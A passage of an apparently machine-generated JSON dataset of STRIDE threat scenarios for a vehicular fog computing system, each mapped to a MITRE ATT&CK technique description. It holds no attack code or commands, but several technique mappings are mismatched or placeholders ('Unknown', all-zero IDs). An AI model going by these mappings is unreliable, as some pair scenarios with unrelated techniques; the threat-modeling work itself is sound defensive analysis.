                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker could modify data being transmitted from a smart vehicle to a fog node.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has the ability to access and alter the communication channel between the smart vehicle and the fog node.",
                    "Role": "Attacker",
                    "Condition": "Valid when communication channels are not secured."
                },
                {
                    "Assumption": "Data integrity checks are not applied.",
                    "Role": "System Designer",
                    "Condition": "Valid if the system lacks mechanisms for data verification."
                },
                {
                    "Assumption": "The vehicle firmware lacks security features to detect and respond to tampering.",
                    "Role": "Smart Vehicle",
                    "Condition": "Valid if firmware does not support tampering detection."
                }
            ],
            "Potential Impact": "Compromises data integrity and may mislead subsequent decision-making processes.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "data_integrity",
                "network",
                "injection",
                "vehicle"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker could modify software on a fog node to execute arbitrary code.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has gained physical or remote access to the fog node.",
                    "Role": "Attacker",
                    "Condition": "Valid if fog nodes are inadequately protected."
                },
                {
                    "Assumption": "Software integrity validation checks are not implemented or are insufficient.",
                    "Role": "System Designer",
                    "Condition": "Valid if the system does not check for software integrity."
                },
                {
                    "Assumption": "There\u2019s a lack of regular security updates and patches on fog nodes.",
                    "Role": "System Administrator",
                    "Condition": "Valid if the fog node software is not kept up to date."
                }
            ],
            "Potential Impact": "Could result in arbitrary code execution, data tampering, and system compromise.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "code_execution",
                "fog_node",
                "software"
            ],
            "mitre_technique": {
                "name": "Code Signing",
                "description": "Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with. (Citation: Wikipedia Code Signing) However, adversaries are known to use code signing certificates to masquerade malware and tools as legitimate binaries (Citation: Janicab). The certificates used during an operation may be created, forged, or stolen by the adversary. (Citation: Securelist Digital Certificates) (Citation: Symantec Digital Certificates)\n\nCode signing to verify software on first run can be used on modern Windows and macOS/OS X systems. It is not used on Linux due to the decentralized nature of the platform. (Citation: Wikipedia Code Signing)\n\nCode signing certificates may be used to bypass security policies that require signed code to execute on a system.",
                "id": "attack-pattern--1b84d551-6de8-4b96-9930-d177677c3b1d",
                "technique_id": "T1116"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker could alter data stored on cloud services to manipulate analytics outcomes.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has compromised cloud service accounts or has elevated privileges.",
                    "Role": "Attacker",
                    "Condition": "Valid under poor access control and weak credential management."
                },
                {
                    "Assumption": "Data integrity checks are not performed on data stored in cloud services.",
                    "Role": "System Administrator",
                    "Condition": "Valid if no integrity validation is in place."
                },
                {
                    "Assumption": "There\u2019s no real-time monitoring for unusual activities on the cloud services.",
                    "Role": "System Operator",
                    "Condition": "Valid if the monitoring system is inadequate or non-existent."
                }
            ],
            "Potential Impact": "May lead to critical misinformed decisions and breach of data integrity.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "cloud",
                "data_manipulation",
                "storage"
            ],
            "mitre_technique": {
                "name": "Modify Cloud Compute Infrastructure",
                "description": "An adversary may attempt to modify a cloud account's compute service infrastructure to evade defenses. A modification to the compute service infrastructure can include the creation, deletion, or modification of one or more components such as compute instances, virtual machines, and snapshots.\n\nPermissions gained from the modification of infrastructure components may bypass restrictions that prevent access to existing infrastructure. Modifying infrastructure components may also allow an adversary to evade detection and remove evidence of their presence.(Citation: Mandiant M-Trends 2020)",
                "id": "attack-pattern--144e007b-e638-431d-a894-45d90c54ab90",
                "technique_id": "T1578"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker denies receiving or sending communications between smart vehicles and fog nodes.",
            "Assumptions": [
                {
                    "Assumption": "Logging mechanisms are not enforced or logs are easily manipulated.",
                    "Role": "System Designer",
                    "Condition": "Valid if the system lacks comprehensive and secure logging."
                },
                {
                    "Assumption": "There\u2019s no method to cryptographically verify the origin and receipt of messages.",
                    "Role": "System Developer",
                    "Condition": "Valid if message signing is not used."
                },
                {
                    "Assumption": "Weak access control policies allowing unauthorized access to logs.",
                    "Role": "System Administrator",
                    "Condition": "Valid under poor access management."
                }
            ],
            "Potential Impact": "Creates ambiguity around transactions and communications, complicating forensic investigations.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "logging",
                "communication",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker manipulates the logging mechanisms on fog nodes.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has gained access to the fog node, either physically or remotely.",
                    "Role": "Attacker",
                    "Condition": "Valid if fog nodes are inadequately secured."
                },
                {
                    "Assumption": "Logs are not protected against unauthorized modification or deletion.",
                    "Role": "System Developer",
                    "Condition": "Valid if log protection features are absent."
                },
                {
                    "Assumption": "Insufficient monitoring and anomaly detection mechanisms on fog nodes.",
                    "Role": "System Operator",
                    "Condition": "Valid if monitoring systems are weak or absent."
                }
            ],
            "Potential Impact": "Allows attackers to cover their tracks and hinders incident response efforts.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "log_modification",
                "fog_node",
                "anomaly_detection"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker could deny tampering with data after compromising cloud services.",
            "Assumptions": [
                {
                    "Assumption": "Cloud services lack comprehensive and secure logging mechanisms.",
                    "Role": "System Designer",
                    "Condition": "Valid if cloud logs do not have sufficient security."
                },
                {
                    "Assumption": "There\u2019s no method to verify the integrity of the actions performed on the cloud.",
                    "Role": "System Administrator",
                    "Condition": "Valid if activity logs are not cross-verified."
                },
                {
                    "Assumption": "Access control mechanisms are weak and allow unauthorized log access.",
                    "Role": "System Operator",
                    "Condition": "Valid under poor access management practices."
                }
            ],
            "Potential Impact": "Complicates audit trails and accountability, making it difficult to trace attack origin.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "cloud_services",
                "log_tampering",
                "access_control"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker intercepts unencrypted data being sent between smart vehicles and fog nodes.",
            "Assumptions": [
                {
                    "Assumption": "The communication channel between smart vehicles and fog nodes is not encrypted.",
                    "Role": "System Designer",
                    "Condition": "Valid if encryption protocols are not enforced."
                },
                {
                    "Assumption": "No detection mechanisms for monitoring data interception attempts.",
                    "Role": "System Operator",
                    "Condition": "Valid if intrusion detection systems are not in place."
                },
                {
                    "Assumption": "Weak access control policies on communication infrastructure.",
                    "Role": "System Administrator",
                    "Condition": "Valid under poor security management."
                }
            ],
            "Potential Impact": "Results in unauthorized disclosure of sensitive data and privacy breaches.",
            "MITRE ATT&CK Keywords": [
                "information_disclosure",
                "data_interception",
                "unencrypted_communication",
                "privacy"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker accesses sensitive data stored on fog nodes.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has exploited vulnerabilities to gain access to fog nodes.",
                    "Role": "Attacker",
                    "Condition": "Valid under the presence of unpatched vulnerabilities."
                },
                {
                    "Assumption": "Stored data is not encrypted or protected by strong access controls.",
                    "Role": "System Designer",
                    "Condition": "Valid if data protection mechanisms are missing."
                },
                {
                    "Assumption": "Insufficient monitoring and logging of data access on fog nodes.",
                    "Role": "System Administrator",
                    "Condition": "Valid if monitoring systems are weak or absent."
                }
            ],
            "Potential Impact": "Leads to unauthorized access and potential misuse of sensitive information.",
            "MITRE ATT&CK Keywords": [
                "information_disclosure",
                "data_access",
                "fog_nodes",
                "sensitive_information"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker exfiltrates data from cloud services used in the VFC system.",
            "Assumptions": [
                {
                    "Assumption": "The cloud service account has been compromised through weak credentials or social engineering.",
                    "Role": "Attacker",
                    "Condition": "Valid under the presence of poor credential management."
                },
                {
                    "Assumption": "There are no network security controls to prevent unauthorized data exfiltration.",
                    "Role": "System Administrator",
                    "Condition": "Valid if network defenses are inadequate."
                },
                {
                    "Assumption": "Data stored in the cloud is not encrypted or protected sufficiently.",
                    "Role": "System Designer",
                    "Condition": "Valid if data encryption is not implemented."
                }
            ],
            "Potential Impact": "Results in data breaches and loss of sensitive information stored in the cloud.",
            "MITRE ATT&CK Keywords": [
                "information_disclosure",
                "cloud",
                "data_exfiltration",
                "sensitive_data"
            ],
            "mitre_technique": {
                "name": "Data from Cloud Storage",
                "description": "Adversaries may access data from cloud storage.\n\nMany IaaS providers offer solutions for online data object storage such as Amazon S3, Azure Storage, and Google Cloud Storage. Similarly, SaaS enterprise platforms such as Office 365 and Google Workspace provide cloud-based document storage to users through services such as OneDrive and Google Drive, while SaaS application providers such as Slack, Confluence, Salesforce, and Dropbox may provide cloud storage solutions as a peripheral or primary use case of their platform. \n\nIn some cases, as with IaaS-based cloud storage, there exists no overarching application (such as SQL or Elasticsearch) with which to interact with the stored objects: instead, data from these solutions is retrieved directly though the [Cloud API](https://attack.mitre.org/techniques/T1059/009). In SaaS applications, adversaries may be able to collect this data directly from APIs or backend cloud storage objects, rather than through their front-end application or interface (i.e., [Data from Information Repositories](https://attack.mitre.org/techniques/T1213)). \n\nAdversaries may collect sensitive data from these cloud storage solutions. Providers typically offer security guides to help end users configure systems, though misconfigurations are a common problem.(Citation: Amazon S3 Security, 2019)(Citation: Microsoft Azure Storage Security, 2019)(Citation: Google Cloud Storage Best Practices, 2019) There have been numerous incidents where cloud storage has been improperly secured, typically by unintentionally allowing public access to unauthenticated users, overly-broad access by all users, or even access for any anonymous person outside the control of the Identity Access Management system without even needing basic user permissions.\n\nThis open access may expose various types of sensitive data, such as credit cards, personally identifiable information, or medical records.(Citation: Trend Micro S3 Exposed PII, 2017)(Citation: Wired Magecart S3 Buckets, 2019)(Citation: HIPAA Journal S3 Breach, 2017)(Citation: Rclone-mega-extortion_05_2021)\n\nAdversaries may also obtain then abuse leaked credentials from source repositories, logs, or other means as a way to gain access to cloud storage objects.",
                "id": "attack-pattern--3298ce88-1628-43b1-87d9-0b5336b193d7",
                "technique_id": "T1530"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker overwhelms fog nodes with excessive traffic, leading to service disruption.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can generate sufficient traffic to overwhelm fog nodes.",
                    "Role": "Attacker",
                    "Condition": "Valid if rate limiting is not implemented."
                },
                {
                    "Assumption": "No redundancy or load balancing mechanisms are in place to handle traffic spikes.",
                    "Role": "System Designer",
                    "Condition": "Valid if the system lacks traffic management features."
                },
                {
                    "Assumption": "The fog nodes are not protected by robust DoS mitigation techniques.",
                    "Role": "System Administrator",
                    "Condition": "Valid if DoS protection is weak or absent."
                }
            ],
            "Potential Impact": "Service disruption and potential data loss or delays in processing.",
            "MITRE ATT&CK Keywords": [
                "denial_of_service",
                "traffic_overload",
                "fog_node",
                "service_disruption"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker targets cloud services with a distributed denial of service (DDoS) attack.",
            "Assumptions": [
                {
                    "Assumption": "The attacker controls a botnet capable of generating massive traffic.",
                    "Role": "Attacker",
                    "Condition": "Valid if the attacker controls sufficient resources."
                },
                {
                    "Assumption": "Cloud services lack adequate DDoS protection mechanisms.",
                    "Role": "System Designer",
                    "Condition": "Valid if cloud services are not protected against DDoS attacks."
                },
                {
                    "Assumption": "Insufficient scalability to handle traffic surges during attacks.",
                    "Role": "System Architect",
                    "Condition": "Valid if the cloud infrastructure is not designed for scalability."
                }
            ],
            "Potential Impact": "Disruption of cloud services and potential delays in critical data processing and storage.",
            "MITRE ATT&CK Keywords": [
                "denial_of_service",
                "ddos",
                "cloud_services",
                "service_outage"
            ],
            "mitre_technique": {
                "name": "Network Denial of Service",
                "description": "Adversaries may perform Network Denial of Service (DoS) attacks to degrade or block the availability of targeted resources to users. Network DoS can be performed by exhausting the network bandwidth services rely on. Example resources include specific websites, email services, DNS, and web-based applications. Adversaries have been observed conducting network DoS attacks for political purposes(Citation: FireEye OpPoisonedHandover February 2016) and to support other malicious activities, including distraction(Citation: FSISAC FraudNetDoS September 2012), hacktivism, and extortion.(Citation: Symantec DDoS October 2014)\n\nA Network DoS will occur when the bandwidth capacity of the network connection to a system is exhausted due to the volume of malicious traffic directed at the resource or the network connections and network devices the resource relies on. For example, an adversary may send 10Gbps of traffic to a server that is hosted by a network with a 1Gbps connection to the internet. This traffic can be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\n\nTo perform Network DoS attacks several aspects apply to multiple methods, including IP address spoofing, and botnets.\n\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\n\nFor DoS attacks targeting the hosting system directly, see [Endpoint Denial of Service](https://attack.mitre.org/techniques/T1499).",
                "id": "attack-pattern--d74c4a7e-ffbf-432f-9365-7ebf1f787cab",
                "technique_id": "T1498"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker exploits a vulnerability in a fog node to crash the system.",
            "Assumptions": [
                {
                    "Assumption": "The fog node software has unpatched vulnerabilities.",
                    "Role": "System Administrator",
                    "Condition": "Valid if regular patching and updates are not performed."
                },
                {
                    "Assumption": "The attacker has identified and can exploit the vulnerability.",
                    "Role": "Attacker",
                    "Condition": "Valid if the attacker has the necessary technical knowledge and tools."
                },
                {
                    "Assumption": "No fallback or failover mechanisms are in place for handling crashed fog nodes.",
                    "Role": "System Architect",
                    "Condition": "Valid if redundancy is not designed into the system."
                }
            ],
            "Potential Impact": "Service disruption and interruption of data processing among affected fog nodes.",
            "MITRE ATT&CK Keywords": [
                "denial_of_service",
                "vulnerability_exploit",
                "fog_node",
                "service_disruption"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker escalates privileges on a fog node to gain unauthorized access.",
            "Assumptions": [
                {
                    "Assumption": "The fog node has exploitable vulnerabilities for privilege escalation.",
                    "Role": "System Administrator",
                    "Condition": "Valid under the presence of known security flaws."
                },
                {
                    "Assumption": "The attacker has initial access to the fog node.",
                    "Role": "Attacker",
                    "Condition": "Valid if initial security measures are bypassed."
                },
                {
                    "Assumption": "Insufficient privilege separation or role-based access controls.",
                    "Role": "System Designer",
                    "Condition": "Valid if access control policies are weak or non-existent."
                }
            ],
            "Potential Impact": "Leads to unauthorized access, data tampering, and potential control over critical processes.",
            "MITRE ATT&CK Keywords": [
                "elevation_of_privilege",
                "fog_node",
                "access_control",
                "unauthorized_access"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker gains administrative control over cloud services.",
            "Assumptions": [
                {
                    "Assumption": "Cloud service credentials are weak or compromised.",
                    "Role": "System Administrator",
                    "Condition": "Valid under poor credential management practices."
                },
                {
                    "Assumption": "Security measures to prevent privilege escalation are inadequate.",
                    "Role": "System Designer",
                    "Condition": "Valid if privilege management is weak."
                },
                {
                    "Assumption": "Lack of monitoring for administrative accounts and their activities.",
                    "Role": "System Operator",
                    "Condition": "Valid under weak monitoring practices."
                }
            ],
            "Potential Impact": "Leads to full control over cloud resources, data breaches, and potential system-wide compromise.",
            "MITRE ATT&CK Keywords": [
                "elevation_of_privilege",
                "cloud_services",
                "administrative_access",
                "credential_compromise"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker escalates privileges on a smart vehicle to tamper with VFC communications.",
            "Assumptions": [
                {
                    "Assumption": "The smart vehicle's firmware has vulnerabilities allowing privilege escalation.",
                    "Role": "System Developer",
                    "Condition": "Valid if the firmware is not properly secured."
                },
                {
                    "Assumption": "The attacker has a foothold on the vehicle\u2019s system, possibly through physical or remote access.",
                    "Role": "Attacker",
                    "Condition": "Valid if initial security is bypassed."
                },
                {
                    "Assumption": "Privilege separation within the vehicle\u2019s system is weak or poorly enforced.",
                    "Role": "System Designer",
                    "Condition": "Valid if segregation of duties and roles is not implemented."
                }
            ],
            "Potential Impact": "Allows tampering with data and communication, potentially impacting the integrity and availability of the VFC system.",
            "MITRE ATT&CK Keywords": [
                "elevation_of_privilege",
                "smart_vehicle",
                "firmware",
                "data_tampering"
            ],
            "mitre_technique": {
                "name": "System Firmware",
                "description": "Adversaries may modify system firmware to persist on systems.The BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) or Extensible Firmware Interface (EFI) are examples of system firmware that operate as the software interface between the operating system and hardware of a computer.(Citation: Wikipedia BIOS)(Citation: Wikipedia UEFI)(Citation: About UEFI)\n\nSystem firmware like BIOS and (U)EFI underly the functionality of a computer and may be modified by an adversary to perform or assist in malicious activity. Capabilities exist to overwrite the system firmware, which may give sophisticated adversaries a means to install malicious firmware updates as a means of persistence on a system that may be difficult to detect.",
                "id": "attack-pattern--16ab6452-c3c1-497c-a47d-206018ca1ada",
                "technique_id": "T1542.001"
            }
        }
    ]
},
{
    "case_number": "11",
    "batch_number": "8",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker could spoof the identity of a smart vehicle to send false road condition data to fog nodes.",
            "Assumptions": [
                {
                    "Assumption": "Lack of mutual authentication between smart vehicles and fog nodes",
                    "Role": "System Architects",
                    "Condition": "Implemented security protocol does not require mutual authentication"
                },
                {
                    "Assumption": "Attackers have access to past, legitimate communications to analyze",
                    "Role": "Attackers",
                    "Condition": "Attackers can intercept or capture legitimate data flow between smart vehicles and fog nodes"
                }
            ],
            "Potential Impact": "Unauthorized disclosure, corruption of data, and disruption of traffic management.",
            "MITRE ATT&CK Keywords": [
                "injection",
                "identity theft",
                "network communication"
            ],
            "mitre_technique": {
                "name": "Content Injection",
                "description": "Adversaries may gain access and continuously communicate with victims by injecting malicious content into systems through online network traffic. Rather than luring victims to malicious payloads hosted on a compromised website (i.e., [Drive-by Target](https://attack.mitre.org/techniques/T1608/004) followed by [Drive-by Compromise](https://attack.mitre.org/techniques/T1189)), adversaries may initially access victims through compromised data-transfer channels where they can manipulate traffic and/or inject their own content. These compromised online network channels may also be used to deliver additional payloads (i.e., [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) and other data to already compromised systems.(Citation: ESET MoustachedBouncer)\n\nAdversaries may inject content to victim systems in various ways, including:\n\n* From the middle, where the adversary is in-between legitimate online client-server communications (**Note:** this is similar but distinct from [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557), which describes AiTM activity solely within an enterprise environment) (Citation: Kaspersky Encyclopedia MiTM)\n* From the side, where malicious content is injected and races to the client as a fake response to requests of a legitimate online server (Citation: Kaspersky ManOnTheSide)\n\nContent injection is often the result of compromised upstream communication channels, for example at the level of an internet service provider (ISP) as is the case with \"lawful interception.\"(Citation: Kaspersky ManOnTheSide)(Citation: ESET MoustachedBouncer)(Citation: EFF China GitHub Attack)",
                "id": "attack-pattern--43c9bc06-715b-42db-972f-52d25c09a20c",
                "technique_id": "T1659"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker could spoof roadside units (RSUs) to send false traffic light scheduling information to smart vehicles.",
            "Assumptions": [
                {
                    "Assumption": "No robust authentication mechanism between RSUs and smart vehicles",
                    "Role": "System Architects",
                    "Condition": "Authentication protocol does not enforce strong verification checks"
                },
                {
                    "Assumption": "Attackers can physically access RSUs or intercept wireless communications",
                    "Role": "Attackers",
                    "Condition": "RSUs lack physical and wireless communication security"
                }
            ],
            "Potential Impact": "Disruption of traffic flow and potential accidents.",
            "MITRE ATT&CK Keywords": [
                "identity theft",
                "RSU spoofing",
                "wireless communication"
            ],
            "mitre_technique": {
                "name": "Wireless Compromise",
                "description": "Adversaries may perform wireless compromise as a method of gaining communications and unauthorized access to a wireless network. Access to a wireless network may be gained through the compromise of a wireless device. (Citation: Alexander Bolshev, Gleb Cherbov July 2014) (Citation: Alexander Bolshev March 2014) Adversaries may also utilize radios and other wireless communication devices on the same frequency as the wireless network. Wireless compromise can be done as an initial access vector from a remote distance. \n\nA Polish student used a modified TV remote controller to gain access to and control over the Lodz city tram system in Poland. (Citation: John Bill May 2017) (Citation: Shelley Smith February 2008) The remote controller device allowed the student to interface with the trams network to modify track settings and override operator control. The adversary may have accomplished this by aligning the controller to the frequency and amplitude of IR control protocol signals. (Citation: Bruce Schneier January 2008) The controller then enabled initial access to the network, allowing the capture and replay of tram signals. (Citation: John Bill May 2017)",
                "id": "attack-pattern--2877063e-1851-48d2-bcc6-bc1d2733157e",
                "technique_id": "T0860"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Adversaries spoof cloud service endpoints to intercept data destined for centralized servers.",
            "Assumptions": [
                {
                    "Assumption": "Insufficient verification of cloud service endpoints",
                    "Role": "System Architects",
                    "Condition": "Weak endpoint verification mechanisms in the system"
                },
                {
                    "Assumption": "Attackers possess the capability to insert themselves into data flows",
                    "Role": "Attackers",
                    "Condition": "Man-in-the-middle attack capability"
                }
            ],
            "Potential Impact": "Data interception and unauthorized access to sensitive information.",
            "MITRE ATT&CK Keywords": [
                "man-in-the-middle",
                "cloud spoofing",
                "endpoint compromise"
            ],
            "mitre_technique": {
                "name": "Manipulation of Control",
                "description": "Adversaries may manipulate physical process control within the industrial environment. Methods of manipulating control can include changes to set point values, tags, or other parameters. Adversaries may manipulate control systems devices or possibly leverage their own, to communicate with and command physical control processes. The duration of manipulation may be temporary or longer sustained, depending on operator detection.   \n\nMethods of Manipulation of Control include: \n\n* Man-in-the-middle  \n* Spoof command message \n* Changing setpoints  \n\nA Polish student used a remote controller device to interface with the Lodz city tram system in Poland. (Citation: John Bill May 2017) (Citation: Shelley Smith February 2008) (Citation: Bruce Schneier January 2008) Using this remote, the student was able to capture and replay legitimate tram signals. As a consequence, four trams were derailed and twelve people injured due to resulting emergency stops. (Citation: Shelley Smith February 2008) The track controlling commands issued may have also resulted in tram collisions, a further risk to those on board and nearby the areas of impact. (Citation: Bruce Schneier January 2008)",
                "id": "attack-pattern--1af9e3fd-2bcc-414d-adbd-fe3b95c02ca1",
                "technique_id": "T0831"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies data packets between smart vehicles and fog nodes, leading to incorrect processing.",
            "Assumptions": [
                {
                    "Assumption": "Lack of end-to-end data integrity checks for communications",
                    "Role": "System Developers",
                    "Condition": "Implemented communication protocol does not verify data integrity"
                },
                {
                    "Assumption": "Attackers can intercept and modify data en route",
                    "Role": "Attackers",
                    "Condition": "Ability to perform man-in-the-middle or packet injection attacks"
                }
            ],
            "Potential Impact": "Corruption of critical data and potential misbehavior in vehicle control systems.",
            "MITRE ATT&CK Keywords": [
                "data manipulation",
                "packet injection",
                "system corruption"
            ],
            "mitre_technique": {
                "name": "Transmitted Data Manipulation",
